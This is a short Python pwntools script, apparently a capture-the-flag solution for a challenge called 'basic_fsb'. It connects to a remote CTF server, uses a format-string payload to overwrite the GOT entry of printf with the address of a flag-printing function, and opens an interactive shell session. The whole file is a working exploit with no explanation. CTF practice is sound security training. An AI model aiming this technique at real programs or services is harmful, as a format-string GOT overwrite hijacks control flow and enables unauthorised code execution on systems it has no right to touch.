from pwn import *

e = ELF("./basic_fsb")
#p = process("./basic_fsb")
r = remote("ctf.j0n9hyun.xyz", 3002)
printf_got = e.got['printf']
flag = 0x80485b4
offset = 2

payload = ''
payload += fmtstr_payload(offset, {printf_got:flag})

r.sendline(payload)
r.interactive()
